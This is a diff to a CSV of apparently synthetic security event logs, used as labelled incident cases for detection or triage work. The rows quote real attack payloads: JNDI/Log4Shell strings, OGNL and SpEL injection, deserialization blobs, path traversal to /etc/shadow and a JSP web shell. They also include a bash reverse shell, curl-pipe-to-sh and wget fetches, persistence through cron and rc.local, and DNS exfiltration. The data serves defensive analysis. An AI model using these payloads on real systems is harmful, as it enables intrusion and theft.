@@ -1,4 +1,4 @@
-﻿event_id,batch_id,incident_id,case_id,timestamp,source,log_id,content
+event_id,batch_id,incident_id,case_id,timestamp,source,log_id,content
 WAF0410001,BATCH-20261014-CASE008,INC-CASE008-001,CASE-008,2026-10-14 08:12:03+08:00,waf,WAF0410001,host=app-web-31.ops-corp.com POST /ecp/7b37f0/ecp.aspx X-BEResource=localhost~1942062522 502
 WEB0410002,BATCH-20261014-CASE008,INC-CASE008-001,CASE-008,2026-10-14 08:12:05+08:00,web,WEB0410002,host=app-web-31.ops-corp.com POST /ecp/7b37f0/ecp.aspx X-BEResource=localhost~1942062522 502 upstream_timeout
 HID0410003,BATCH-20261014-CASE008,INC-CASE008-001,CASE-008,2026-10-14 08:12:40+08:00,hids,HID0410003,host=app-web-31.ops-corp.com 进程创建: w3wp.exe (IIS APPPOOL\DefaultAppPool) 派生子进程 cmd.exe /c whoami & ipconfig /all
@@ -7,14 +7,14 @@ WEB0410005,BATCH-20261014-CASE008,INC-CASE008-001,CASE-008,2026-10-14 08:13:35+0
 HID0410006,BATCH-20261014-CASE008,INC-CASE008-001,CASE-008,2026-10-14 08:20:11+08:00,hids,HID0410006,"host=app-web-31.ops-corp.com C:\ProgramData\PrintSpoofer.exe -i -c ""cmd /c whoami"" 提权成功 (SeImpersonatePrivilege)"
 HID0410007,BATCH-20261014-CASE008,INC-CASE008-001,CASE-008,2026-10-14 08:22:03+08:00,hids,HID0410007,"host=app-web-31.ops-corp.com sc.exe create UpdaterSvc binPath= ""C:\ProgramData\upd.exe"" start= auto"
 DNS0410008,BATCH-20261014-CASE008,INC-CASE008-001,CASE-008,2026-10-14 08:31:47+08:00,dns,DNS0410008,host=app-web-31.ops-corp.com c2VjcmV0LWRhdGEtMDE.exfil-cdn.com TXT 203.0.113.66
-EVT-SIM008-001,BATCH-DEMO-SYNTHETIC-CASE008-001,INC-DEMO-CASE008-001,CASE-008,2026-10-15T09:00:03+08:00,waf,SYNWAF0511001,host=app-web-32.ops-corp.com POST /ecp/a91c2/ecp.aspx X-BEResource=localhost~1942062522 502
-EVT-SIM008-002,BATCH-DEMO-SYNTHETIC-CASE008-001,INC-DEMO-CASE008-001,CASE-008,2026-10-15T09:00:05+08:00,web,SYNWEB0511002,host=app-web-32.ops-corp.com POST /ecp/a91c2/ecp.aspx X-BEResource=localhost~1942062522 502 upstream_timeout
-EVT-SIM008-003,BATCH-DEMO-SYNTHETIC-CASE008-001,INC-DEMO-CASE008-001,CASE-008,2026-10-15T09:00:39+08:00,hids,SYNHID0511003,host=app-web-32.ops-corp.com 进程创建: w3wp.exe (IIS APPPOOL\DefaultAppPool) 派生子进程 cmd.exe /c whoami & ipconfig /all
-EVT-SIM008-004,BATCH-DEMO-SYNTHETIC-CASE008-001,INC-DEMO-CASE008-001,CASE-008,2026-10-15T09:01:14+08:00,rasp,SYNRASP0511004,"host=app-web-32.ops-corp.com POST /aspnet_client/system_web/health.aspx {""cmd"":""whoami""} 200"
-EVT-SIM008-005,BATCH-DEMO-SYNTHETIC-CASE008-001,INC-DEMO-CASE008-001,CASE-008,2026-10-15T09:01:30+08:00,web,SYNWEB0511005,host=app-web-32.ops-corp.com GET /aspnet_client/system_web/health.aspx?cmd=ipconfig 200
-EVT-SIM008-006,BATCH-DEMO-SYNTHETIC-CASE008-001,INC-DEMO-CASE008-001,CASE-008,2026-10-15T09:08:11+08:00,hids,SYNHID0511006,"host=app-web-32.ops-corp.com C:\ProgramData\PrintSpoofer.exe -i -c ""cmd /c whoami"" 提权成功 (SeImpersonatePrivilege)"
-EVT-SIM008-007,BATCH-DEMO-SYNTHETIC-CASE008-001,INC-DEMO-CASE008-001,CASE-008,2026-10-15T09:10:02+08:00,hids,SYNHID0511007,"host=app-web-32.ops-corp.com sc.exe create CacheSync binPath= ""C:\ProgramData\cache.exe"" start= auto"
-EVT-SIM008-008,BATCH-DEMO-SYNTHETIC-CASE008-001,INC-DEMO-CASE008-001,CASE-008,2026-10-15T09:19:47+08:00,dns,SYNDNS0511008,host=app-web-32.ops-corp.com c2VjcmV0LWRhdGEtMDI.exfil-cdn.com TXT 203.0.113.67
+EVT-SIM008-001,BATCH-DEMO-SYNTHETIC-CASE008-001,INC-DEMO-CASE008-001,,2026-10-15T09:00:03+08:00,waf,SYNWAF0511001,host=app-web-32.ops-corp.com POST /ecp/a91c2/ecp.aspx X-BEResource=localhost~1942062522 502
+EVT-SIM008-002,BATCH-DEMO-SYNTHETIC-CASE008-001,INC-DEMO-CASE008-001,,2026-10-15T09:00:05+08:00,web,SYNWEB0511002,host=app-web-32.ops-corp.com POST /ecp/a91c2/ecp.aspx X-BEResource=localhost~1942062522 502 upstream_timeout
+EVT-SIM008-003,BATCH-DEMO-SYNTHETIC-CASE008-001,INC-DEMO-CASE008-001,,2026-10-15T09:00:39+08:00,hids,SYNHID0511003,host=app-web-32.ops-corp.com 进程创建: w3wp.exe (IIS APPPOOL\DefaultAppPool) 派生子进程 cmd.exe /c whoami & ipconfig /all
+EVT-SIM008-004,BATCH-DEMO-SYNTHETIC-CASE008-001,INC-DEMO-CASE008-001,,2026-10-15T09:01:14+08:00,rasp,SYNRASP0511004,"host=app-web-32.ops-corp.com POST /aspnet_client/system_web/health.aspx {""cmd"":""whoami""} 200"
+EVT-SIM008-005,BATCH-DEMO-SYNTHETIC-CASE008-001,INC-DEMO-CASE008-001,,2026-10-15T09:01:30+08:00,web,SYNWEB0511005,host=app-web-32.ops-corp.com GET /aspnet_client/system_web/health.aspx?cmd=ipconfig 200
+EVT-SIM008-006,BATCH-DEMO-SYNTHETIC-CASE008-001,INC-DEMO-CASE008-001,,2026-10-15T09:08:11+08:00,hids,SYNHID0511006,"host=app-web-32.ops-corp.com C:\ProgramData\PrintSpoofer.exe -i -c ""cmd /c whoami"" 提权成功 (SeImpersonatePrivilege)"
+EVT-SIM008-007,BATCH-DEMO-SYNTHETIC-CASE008-001,INC-DEMO-CASE008-001,,2026-10-15T09:10:02+08:00,hids,SYNHID0511007,"host=app-web-32.ops-corp.com sc.exe create CacheSync binPath= ""C:\ProgramData\cache.exe"" start= auto"
+EVT-SIM008-008,BATCH-DEMO-SYNTHETIC-CASE008-001,INC-DEMO-CASE008-001,,2026-10-15T09:19:47+08:00,dns,SYNDNS0511008,host=app-web-32.ops-corp.com c2VjcmV0LWRhdGEtMDI.exfil-cdn.com TXT 203.0.113.67
 EVT-CASE001-01,BATCH-20261021-CASE001,INC-CASE-001-001,CASE-001,2026-10-21 09:00:00+08:00,waf,WAF0340624,/api/v2/login username=${jndi:ldap://10.20.7.31:1389/Basic/Command/Base64/dW5hbWUgLWE=} Mozilla/5.0 (Windows N
 EVT-CASE001-02,BATCH-20261021-CASE001,INC-CASE-001-001,CASE-001,2026-10-21 09:00:01+08:00,web,WEB0342840,/api/v2/login username=${jndi:ldap://10.20.7.31:1389/Basic/Command/Base64/dW5hbWUgLWE=} Mozilla/5.0 (Windows N
 EVT-CASE001-03,BATCH-20261021-CASE001,INC-CASE-001-001,CASE-001,2026-10-21 09:00:03+08:00,rasp,RASP0376865,"https://app-java-152.ops-corp.com/api/v2/login {""jndi"": ""ldap://10.20.7.31:1389""} Mozilla/5.0 (Windows NT 10.0"
@@ -44,3 +44,539 @@ EVT-CASE007-01,BATCH-20261021-CASE007,INC-CASE-007-001,CASE-007,2026-10-21 15:00
 EVT-CASE007-02,BATCH-20261021-CASE007,INC-CASE-007-001,CASE-007,2026-10-21 15:00:01+08:00,web,WEB0462729,/api/v2/pipeline/run job=deps&pkg=lodahs-build-utils@2.3.1&hook=postinstall Mozilla/5.0 (Windows NT 10.0; Win6
 EVT-CASE007-03,BATCH-20261021-CASE007,INC-CASE-007-001,CASE-007,2026-10-21 15:00:03+08:00,rasp,RASP0508665,"https://app-node-41.ops-corp.com/api/v2/pipeline/run {""npm_lifecycle"": ""postinstall"", ""spawn"": ""sh -c""} Mozill"
 EVT-CASE007-04,BATCH-20261021-CASE007,INC-CASE-007-001,CASE-007,2026-10-21 15:01:01+08:00,hids,HID0498234,curl 10.20.5.19/p.sh|sh /bin/sh curl 10.20.5.19/p.sh|sh <== /bin/sh -c 'install.js' <== node /usr/lib/npm
+SIM-1001-1,SIM-B-1001,SIM-INC-1001,CASE-001,2026-06-21 07:34:46,waf,WAF0340624,/api/v2/login username=${jndi:ldap://10.20.7.31:1389/Basic/Command/Base64/dW5hbWUgLWE=} Mozilla/5.0 (Windows N
+SIM-1001-2,SIM-B-1001,SIM-INC-1001,CASE-001,2026-06-21 07:34:47,web,WEB0342840,/api/v2/login username=${jndi:ldap://10.20.7.31:1389/Basic/Command/Base64/dW5hbWUgLWE=} Mozilla/5.0 (Windows N
+SIM-1001-3,SIM-B-1001,SIM-INC-1001,CASE-001,2026-06-21 07:34:49,rasp,RASP0376865,"https://app-java-152.ops-corp.com/api/v2/login {""jndi"": ""ldap://10.20.7.31:1389""} Mozilla/5.0 (Windows NT 10.0"
+SIM-1001-4,SIM-B-1001,SIM-INC-1001,CASE-001,2026-06-21 07:36:46,hids,HID0369142,uname -a /usr/bin/uname uname -a <== /bin/sh -c 'uname -a' <== /usr/bin/java -jar /opt/app/auth-service.jar
+SIM-1002-1,SIM-B-1002,SIM-INC-1002,CASE-009,2026-06-12 07:55:38,waf,WAF0278444,/submit class.module.classLoader.resources.context.parent.pipeline.first.pattern=%{c2}i Mozilla/5.0 (Windows N
+SIM-1002-2,SIM-B-1002,SIM-INC-1002,CASE-009,2026-06-12 07:55:40,web,WEB0280256,/submit class.module.classLoader.resources.context.parent.pipeline.first.pattern=%{c2}i Mozilla/5.0 (Windows N
+SIM-1002-3,SIM-B-1002,SIM-INC-1002,CASE-009,2026-06-12 07:55:41,rasp,RASP0308063,"https://app-spring-27.ops-corp.com/submit {""property"": ""classLoader.first""} Mozilla/5.0 (Windows NT 11.0; Win6"
+SIM-1002-4,SIM-B-1002,SIM-INC-1002,CASE-009,2026-06-12 07:56:40,hids,HID0301755,whoami /usr/bin/whoami whoami <== /bin/sh -c 'whoami' <== /usr/local/tomcat/bin/catalina.sh
+SIM-1003-1,SIM-B-1003,,,2026-06-26 10:52:35,waf,WAF0376175,"/actuator/gateway {""name"":""RewritePath"",""args"":{""_genkey_0"":""#{T(java.lang.Runtime)}""}} Mozilla/5.0 (X11; Linu"
+SIM-1003-2,SIM-B-1003,,,2026-06-26 10:52:36,web,WEB0378622,"/actuator/gateway {""name"":""RewritePath"",""args"":{""_genkey_0"":""#{T(java.lang.Runtime)}""}} Mozilla/5.0 (X11; Linu"
+SIM-1003-3,SIM-B-1003,,,2026-06-26 10:52:37,rasp,RASP0416202,"https://app-spring-95.ops-corp.com/actuator/gateway {""spel"": ""#{T(java.lang.Runtime)}""} Mozilla/5.0 (X11; Linu"
+SIM-1003-4,SIM-B-1003,,,2026-06-26 10:54:03,hids,HID0407665,ssh -o StrictHostKeyChecking=no -i /tmp/.k root@10.20.4.23 id ssh ssh -o StrictHostKeyChecking=no -i /tmp/.k <
+SIM-1004-1,SIM-B-1004,,,2026-06-27 16:37:55,waf,WAF0384754,/pages/doenterpagevariables.action ?queryString=%24%7B%40java.lang.Runtime%40getRuntime Mozilla/5.0 (Macintosh
+SIM-1004-2,SIM-B-1004,,,2026-06-27 16:37:56,web,WEB0387257,/pages/doenterpagevariables.action ?queryString=%24%7B%40java.lang.Runtime%40getRuntime Mozilla/5.0 (Macintosh
+SIM-1004-3,SIM-B-1004,,,2026-06-27 16:37:58,rasp,RASP0425695,"https://app-java-88.ops-corp.com/pages/doenterpagevariables.action {""ognl"": ""exec""} Mozilla/5.0 (Macintosh; In"
+SIM-1004-4,SIM-B-1004,,,2026-06-27 16:39:53,hids,HID0416965,id /usr/bin/id id <== /bin/sh -c 'id' <== /opt/atlassian/confluence/bin/catalina.sh
+SIM-1005-1,SIM-B-1005,,,2026-06-22 16:00:22,waf,WAF0349974,/user/login.action Content-Type: %{(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS)} Mozilla/5.0 (Windows NT 10.0
+SIM-1005-2,SIM-B-1005,,,2026-06-22 16:00:24,web,WEB0352251,/user/login.action Content-Type: %{(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS)} Mozilla/5.0 (Windows NT 10.0
+SIM-1005-3,SIM-B-1005,,,2026-06-22 16:00:26,rasp,RASP0387210,"https://app-tomcat-71.ops-corp.com/user/login.action {""ognl"": ""(#cmd='id')""} Mozilla/5.0 (Windows NT 10.0; Win"
+SIM-1005-4,SIM-B-1005,,,2026-06-22 16:02:23,hids,HID0379274,id;hostname /usr/bin/id id;hostname <== /bin/sh -c 'id;hostname' <== /usr/local/tomcat/bin/catalina.sh
+SIM-1006-1,SIM-B-1006,,,2026-06-16 16:47:09,waf,WAF0308678,/bea_wls_internal/T3 t3 12.2.1 AS:255 HL:19 rO0ABXNyABFqYXZhLnV0aWwuSGFzaE1hcA== Mozilla/5.0 (Linux; Android 1
+SIM-1006-2,SIM-B-1006,,,2026-06-16 16:47:10,web,WEB0310687,/bea_wls_internal/T3 t3 12.2.1 AS:255 HL:19 rO0ABXNyABFqYXZhLnV0aWwuSGFzaE1hcA== Mozilla/5.0 (Linux; Android 1
+SIM-1006-3,SIM-B-1006,,,2026-06-16 16:47:12,rasp,RASP0341517,"https://app-java-41.ops-corp.com/bea_wls_internal/T3 {""t3"": ""rO0ABXNyABFqYXZh""} Mozilla/5.0 (Linux; Android 14"
+SIM-1006-4,SIM-B-1006,,,2026-06-16 16:48:14,hids,HID0334519,nohup /tmp/.w -d <== /bin/sh -c 'nohup /tmp/.w -d' <== java -Dweblogic.Name=AdminServer weblogic.Server
+SIM-1007-1,SIM-B-1007,,,2026-06-16 01:14:43,waf,WAF0304198,"/api/user/profile {""@type"":""com.sun.rowset.JdbcRowSetImpl"",""url"":""ldap://10.20.7.31""} Mozilla/5.0 (iPhone; CPU"
+SIM-1007-2,SIM-B-1007,,,2026-06-16 01:14:44,web,WEB0306177,"/api/user/profile {""@type"":""com.sun.rowset.JdbcRowSetImpl"",""url"":""ldap://10.20.7.31""} Mozilla/5.0 (iPhone; CPU"
+SIM-1007-3,SIM-B-1007,,,2026-06-16 01:14:45,rasp,RASP0336559,"https://app-java-119.ops-corp.com/api/user/profile {""autoType"": ""JdbcRowSetImpl""} Mozilla/5.0 (iPhone; CPU iPh"
+SIM-1007-4,SIM-B-1007,,,2026-06-16 01:16:10,hids,HID0329665,touch /tmp/.x <== /bin/sh -c 'touch /tmp/.x' <== /usr/bin/java -jar /opt/app/user-api.jar
+SIM-1008-1,SIM-B-1008,,,2026-06-28 04:34:48,waf,WAF0388199,/webtools/control/xmlrpc <value>rO0ABXNyABFqYXZhLnV0aWwuSGFzaE1hcA==</value> Mozilla/5.0 (Linux; Android 13; S
+SIM-1008-2,SIM-B-1008,,,2026-06-28 04:34:50,web,WEB0390725,/webtools/control/xmlrpc <value>rO0ABXNyABFqYXZhLnV0aWwuSGFzaE1hcA==</value> Mozilla/5.0 (Linux; Android 13; S
+SIM-1008-3,SIM-B-1008,,,2026-06-28 04:34:51,rasp,RASP0429507,"https://app-java-76.ops-corp.com/webtools/control/xmlrpc {""deserialization"": ""rO0ABXNy""} Mozilla/5.0 (Linux; A"
+SIM-1008-4,SIM-B-1008,,,2026-06-28 04:35:51,hids,HID0420693,env /usr/bin/env env <== /bin/sh -c 'env' <== /usr/bin/java -jar /opt/app/ofbiz.jar
+SIM-1009-1,SIM-B-1009,,,2026-06-20 06:52:00,waf,WAF0333498,/solr/core1/select wt=velocity&v.template=custom&v.template.custom=#set($c=$cmd) Mozilla/5.0 (Windows NT 10.0;
+SIM-1009-2,SIM-B-1009,,,2026-06-20 06:52:01,web,WEB0335668,/solr/core1/select wt=velocity&v.template=custom&v.template.custom=#set($c=$cmd) Mozilla/5.0 (Windows NT 10.0;
+SIM-1009-3,SIM-B-1009,,,2026-06-20 06:52:03,rasp,RASP0368981,"https://app-java-63.ops-corp.com/solr/core1/select {""template"": ""velocity""} Mozilla/5.0 (Windows NT 10.0; Win6"
+SIM-1009-4,SIM-B-1009,,,2026-06-20 06:53:05,hids,HID0361416,sh /tmp/.v <== /bin/sh -c 'sh /tmp/.v' <== /usr/bin/java -jar /opt/solr/server/start.jar
+SIM-1010-1,SIM-B-1010,,,2026-06-06 23:48:26,waf,WAF0241503,/cli command=help&args=@/etc/passwd&remoting=false Mozilla/5.0 (Windows NT 11.0; Win64; x64) AppleWebKit/537.3
+SIM-1010-2,SIM-B-1010,,,2026-06-06 23:48:27,web,WEB0243075,/cli command=help&args=@/etc/passwd&remoting=false Mozilla/5.0 (Windows NT 11.0; Win64; x64) AppleWebKit/537.3
+SIM-1010-3,SIM-B-1010,,,2026-06-06 23:48:29,rasp,RASP0267187,"https://app-java-134.ops-corp.com/cli {""file_read"": ""@/etc/passwd"", ""cli"": ""help""} Mozilla/5.0 (Windows NT 11."
+SIM-1010-4,SIM-B-1010,,,2026-06-06 23:50:00,hids,HID0261725,cat /var/lib/jenkins/config.xml <== /bin/sh -c 'cat config.xml' <== java -jar /opt/app/jenkins.war
+SIM-1011-1,SIM-B-1011,,,2026-06-01 02:47:06,waf,WAF0200842,/index.php ?file=%252e%252e%252f%252e%252e%252f%252e%252e%252fetc%252fpasswd Mozilla/5.0 (X11; Linux x86_64) A
+SIM-1011-2,SIM-B-1011,,,2026-06-01 02:47:08,web,WEB0202149,/index.php ?file=%252e%252e%252f%252e%252e%252f%252e%252e%252fetc%252fpasswd Mozilla/5.0 (X11; Linux x86_64) A
+SIM-1011-3,SIM-B-1011,,,2026-06-01 02:47:09,rasp,RASP0222195,"https://app-php-44.ops-corp.com/index.php {""path_traversal"": ""%252e%252e%252f""} Mozilla/5.0 (X11; Linux x86_64"
+SIM-1011-4,SIM-B-1011,,,2026-06-01 02:48:35,hids,HID0217661,cat /etc/shadow /usr/bin/cat cat /etc/shadow <== /bin/sh -c 'cat /etc/shadow' <== php-fpm: pool www
+SIM-1012-1,SIM-B-1012,,,2026-06-08 13:31:44,waf,WAF0252379,/index.php /%0A%0Aallow_url_include%3Don%0A%0Aauto_prepend_file%3Dphp%3A%2F%2Finput Mozilla/5.0 (Macintosh; In
+SIM-1012-2,SIM-B-1012,,,2026-06-08 13:31:45,web,WEB0254022,/index.php /%0A%0Aallow_url_include%3Don%0A%0Aauto_prepend_file%3Dphp%3A%2F%2Finput Mozilla/5.0 (Macintosh; In
+SIM-1012-3,SIM-B-1012,,,2026-06-08 13:31:47,rasp,RASP0279222,"https://app-php-118.ops-corp.com/index.php {""fpm_newline"": ""auto_prepend""} Mozilla/5.0 (Macintosh; Intel Mac O"
+SIM-1012-4,SIM-B-1012,,,2026-06-08 13:33:17,hids,HID0273512,wget -qO /tmp/.f 10.20.5.77/f <== /bin/sh -c 'wget -qO /tmp/.f 10.20.5.77/f' <== php-fpm: pool www
+SIM-1013-1,SIM-B-1013,,,2026-06-22 01:24:01,waf,WAF0345762,"/_ignition {""solution"":""MakeViewVariableOptionalSolution"",""viewFile"":""phar:///tmp""} Mozilla/5.0 (Windows NT 10"
+SIM-1013-2,SIM-B-1013,,,2026-06-22 01:24:02,web,WEB0348012,"/_ignition {""solution"":""MakeViewVariableOptionalSolution"",""viewFile"":""phar:///tmp""} Mozilla/5.0 (Windows NT 10"
+SIM-1013-3,SIM-B-1013,,,2026-06-22 01:24:03,rasp,RASP0382550,"https://app-php-156.ops-corp.com/_ignition {""deserialization"": ""phar://""} Mozilla/5.0 (Windows NT 10.0; Win64;"
+SIM-1013-4,SIM-B-1013,,,2026-06-22 01:24:58,hids,HID0374705,printf PD9waHAgPz4= > /var/www/html/i.php <== /bin/sh -c 'printf PD9waHAgPz4=' <== php-fpm: pool www
+SIM-1014-1,SIM-B-1014,,,2026-06-20 11:26:20,waf,WAF0334817,/index.php ?lang=zh-cn&s=think\app/invokefunction&function=call_user_func_array Mozilla/5.0 (Linux; Android 14
+SIM-1014-2,SIM-B-1014,,,2026-06-20 11:26:22,web,WEB0336995,/index.php ?lang=zh-cn&s=think\app/invokefunction&function=call_user_func_array Mozilla/5.0 (Linux; Android 14
+SIM-1014-3,SIM-B-1014,,,2026-06-20 11:26:24,rasp,RASP0370439,"https://app-php-83.ops-corp.com/index.php {""invokefunction"": ""call_user_func_array""} Mozilla/5.0 (Linux; Andro"
+SIM-1014-4,SIM-B-1014,,,2026-06-20 11:27:23,hids,HID0362844,ls -la /var/www/html <== /bin/sh -c 'ls -la /var/www/html' <== php-fpm: pool www
+SIM-1015-1,SIM-B-1015,,,2026-06-27 04:49:48,waf,WAF0381351,/api/v1/render ?tpl=constructor.constructor('return process')().binding('spawn_sync') Mozilla/5.0 (iPhone; CPU
+SIM-1015-2,SIM-B-1015,,,2026-06-27 04:49:49,web,WEB0383832,/api/v1/render ?tpl=constructor.constructor('return process')().binding('spawn_sync') Mozilla/5.0 (iPhone; CPU
+SIM-1015-3,SIM-B-1015,,,2026-06-27 04:49:51,rasp,RASP0421930,"https://app-node-62.ops-corp.com/api/v1/render {""binding"": ""spawn_sync"", ""escape"": ""vm""} Mozilla/5.0 (iPhone; "
+SIM-1015-4,SIM-B-1015,,,2026-06-27 04:50:53,hids,HID0413272,bash -i >& /dev/tcp/10.20.7.31/9001 0>&1 <== /bin/sh -c 'bash -i' <== /usr/bin/node /opt/app/render.js
+SIM-1016-1,SIM-B-1016,,,2026-06-07 07:41:05,waf,WAF0243774,/api/avatar url=http://169.254.169.254/latest/meta-data/&x-middleware-subrequest=middleware:middleware:middlew
+SIM-1016-2,SIM-B-1016,,,2026-06-07 07:41:06,web,WEB0245361,/api/avatar url=http://169.254.169.254/latest/meta-data/&x-middleware-subrequest=middleware:middleware:middlew
+SIM-1016-3,SIM-B-1016,,,2026-06-07 07:41:07,rasp,RASP0269700,"https://app-node-149.ops-corp.com/api/avatar {""ssrf"": ""169.254.169.254"", ""bypass"": ""x-middleware-subrequest""} "
+SIM-1016-4,SIM-B-1016,,,2026-06-07 07:43:08,hids,HID0264189,curl 169.254.169.254/latest <== /bin/sh -c 'curl 169.254.169.254' <== /usr/bin/node /opt/app/server.js
+SIM-1017-1,SIM-B-1017,,,2026-06-04 16:53:15,waf,WAF0225668,/public/plugins/alertlist/ ../../../../../../etc/grafana/grafana.ini Mozilla/5.0 (Windows NT 10.0; Win64; x64)
+SIM-1017-2,SIM-B-1017,,,2026-06-04 16:53:17,web,WEB0227137,/public/plugins/alertlist/ ../../../../../../etc/grafana/grafana.ini Mozilla/5.0 (Windows NT 10.0; Win64; x64)
+SIM-1017-3,SIM-B-1017,,,2026-06-04 16:53:18,rasp,RASP0249666,"https://app-go-109.ops-corp.com/public/plugins/alertlist/ {""traversal"": ""etc/grafana.db""} Mozilla/5.0 (Windows"
+SIM-1017-4,SIM-B-1017,,,2026-06-04 16:55:13,hids,HID0244567,cat /etc/grafana/grafana.ini <== /bin/sh -c 'cat /etc/grafana/grafana.ini' <== grafana-server
+SIM-1018-1,SIM-B-1018,,,2026-06-16 05:42:09,waf,WAF0305483,/h2-console/login.do driver=javax.naming.InitialContext&url=ldap://10.20.5.19 Mozilla/5.0 (Windows NT 11.0; Wi
+SIM-1018-2,SIM-B-1018,,,2026-06-16 05:42:10,web,WEB0307470,/h2-console/login.do driver=javax.naming.InitialContext&url=ldap://10.20.5.19 Mozilla/5.0 (Windows NT 11.0; Wi
+SIM-1018-3,SIM-B-1018,,,2026-06-16 05:42:12,rasp,RASP0337981,"https://app-spring-2.ops-corp.com/h2-console/login.do {""jndi"": ""ldap://10.20.5.19""} Mozilla/5.0 (Windows NT 11"
+SIM-1018-4,SIM-B-1018,,,2026-06-16 05:43:07,hids,HID0331055,chmod +x /tmp/.h2 <== /bin/sh -c 'chmod +x /tmp/.h2' <== /usr/bin/java -jar /opt/app/admin.jar
+SIM-1019-1,SIM-B-1019,,,2026-06-03 21:23:12,waf,WAF0220045,/report/export ?year=2026 AND 1=CAST((SELECT version()) AS int) Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/53
+SIM-1019-2,SIM-B-1019,,,2026-06-03 21:23:14,web,WEB0221477,/report/export ?year=2026 AND 1=CAST((SELECT version()) AS int) Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/53
+SIM-1019-3,SIM-B-1019,,,2026-06-03 21:23:15,rasp,RASP0243444,"https://app-django-187.ops-corp.com/report/export {""sqli"": ""cast_error"", ""engine"": ""postgres""} Mozilla/5.0 (X1"
+SIM-1019-4,SIM-B-1019,,,2026-06-03 21:25:14,hids,HID0238475,cat /opt/app/settings.py <== /bin/sh -c 'cat /opt/app/settings.py' <== /usr/bin/python3 /opt/app/manage.py
+SIM-1020-1,SIM-B-1020,,,2026-06-30 09:33:08,waf,WAF0403473,/api/v3/session authenticity_token=BAhvOhhBY3RpdmVTdXBwb3J0OjpUaW1lV2l0aFpvbmU Mozilla/5.0 (Macintosh; Intel M
+SIM-1020-2,SIM-B-1020,,,2026-06-30 09:33:09,web,WEB0406098,/api/v3/session authenticity_token=BAhvOhhBY3RpdmVTdXBwb3J0OjpUaW1lV2l0aFpvbmU Mozilla/5.0 (Macintosh; Intel M
+SIM-1020-3,SIM-B-1020,,,2026-06-30 09:33:11,rasp,RASP0446407,"https://app-rails-55.ops-corp.com/api/v3/session {""deserialization"": ""Marshal""} Mozilla/5.0 (Macintosh; Intel "
+SIM-1020-4,SIM-B-1020,,,2026-06-30 09:34:41,hids,HID0437247,echo @reboot /tmp/.r>>/var/spool/cron/root <== /bin/sh -c 'echo @reboot /tmp/.r' <== ruby /opt/app/bin/rails
+SIM-1021-1,SIM-B-1021,SIM-INC-1021,CASE-002,2026-06-27 10:04:59,waf,WAF0382866,"/uploads/cmd.jsp/ PUT <%@ page import=""java.util.*""%><% Runtime.getRuntime().exec(""id"")%> Mozilla/5.0 (Windows"
+SIM-1021-2,SIM-B-1021,SIM-INC-1021,CASE-002,2026-06-27 10:05:00,web,WEB0385357,"/uploads/cmd.jsp/ PUT <%@ page import=""java.util.*""%><% Runtime.getRuntime().exec(""id"")%> Mozilla/5.0 (Windows"
+SIM-1021-3,SIM-B-1021,SIM-INC-1021,CASE-002,2026-06-27 10:05:02,rasp,RASP0423606,"https://app-tomcat-77.ops-corp.com/uploads/cmd.jsp/ {""upload"": ""cmd.jsp"", ""rce"": ""exec""} Mozilla/5.0 (Windows "
+SIM-1021-4,SIM-B-1021,SIM-INC-1021,CASE-002,2026-06-27 10:07:04,hids,HID0414919,id; hostname /usr/bin/id id; hostname <== /bin/sh -c 'id; hostname' <== /usr/local/tomcat/bin/catalina.sh
+SIM-1021-5,SIM-B-1021,SIM-INC-1021,CASE-002,2026-06-27 12:31:04,dns,DNS0398919,a16f2990.vqmxld-2b71.net A 10.10.23.180
+SIM-1021-6,SIM-B-1021,SIM-INC-1021,CASE-002,2026-06-27 12:31:27,dns,DNS0398921,ae823f83.vqmxld-2b71.net A 10.10.36.219
+SIM-1021-7,SIM-B-1021,SIM-INC-1021,CASE-002,2026-06-27 12:32:02,dns,DNS0398924,af0c3d5f.vqmxld-2b71.net A 203.0.113.109
+SIM-1022-1,SIM-B-1022,,,2026-06-24 14:32:44,waf,WAF0363392,/HtmlAdaptor ?action=invokeOpByName&name=jboss.admin:service=MLet&methodName=next Mozilla/5.0 (Windows NT 11.0
+SIM-1022-2,SIM-B-1022,,,2026-06-24 14:32:46,web,WEB0365757,/HtmlAdaptor ?action=invokeOpByName&name=jboss.admin:service=MLet&methodName=next Mozilla/5.0 (Windows NT 11.0
+SIM-1022-3,SIM-B-1022,,,2026-06-24 14:32:47,rasp,RASP0402058,"https://app-java-24.ops-corp.com/HtmlAdaptor {""mbean"": ""MLet"", ""invoke"": ""jboss.admin""} Mozilla/5.0 (Windows N"
+SIM-1022-4,SIM-B-1022,,,2026-06-24 14:34:46,hids,HID0393816,uname -a /usr/bin/uname uname -a <== /bin/sh -c 'uname -a' <== /usr/bin/java -jar /opt/jboss/jboss-modules.jar
+SIM-1022-5,SIM-B-1022,,,2026-06-25 09:10:46,dns,DNS0383038,3b977a87.rjbhpu-88ca.com A 10.10.28.152
+SIM-1022-6,SIM-B-1022,,,2026-06-25 09:11:27,dns,DNS0383042,4a67dbcb.rjbhpu-88ca.com A 198.51.100.46
+SIM-1022-7,SIM-B-1022,,,2026-06-25 09:12:48,dns,DNS0383048,f9f1043a.rjbhpu-88ca.com A 10.10.40.116
+SIM-1023-1,SIM-B-1023,,,2026-06-10 12:35:45,waf,WAF0265950,/axis2-admin/upload POST evil.aar Content-Type: application/octet-stream PK%03%04 Mozilla/5.0 (Windows NT 10.0
+SIM-1023-2,SIM-B-1023,,,2026-06-10 12:35:46,web,WEB0267681,/axis2-admin/upload POST evil.aar Content-Type: application/octet-stream PK%03%04 Mozilla/5.0 (Windows NT 10.0
+SIM-1023-3,SIM-B-1023,,,2026-06-10 12:35:48,rasp,RASP0294238,"https://app-java-61.ops-corp.com/axis2-admin/upload {""upload"": ""evil.aar"", ""svc"": ""axis""} Mozilla/5.0 (Windows"
+SIM-1023-4,SIM-B-1023,,,2026-06-10 12:37:13,hids,HID0288218,echo /tmp/.svc>>/etc/rc.local sh sh -c 'echo /tmp/.svc>>/etc/rc.local' <== java -jar axis2.jar
+SIM-1023-5,SIM-B-1023,,,2026-06-10 13:19:13,dns,DNS0272959,29134fe9.wtzsgn-4e0d.org A 192.0.2.33
+SIM-1023-6,SIM-B-1023,,,2026-06-10 13:20:10,dns,DNS0272964,6eb53daa.wtzsgn-4e0d.org A 10.10.32.6
+SIM-1023-7,SIM-B-1023,,,2026-06-10 13:21:40,dns,DNS0272972,cc7d986e.wtzsgn-4e0d.org A 10.10.41.180
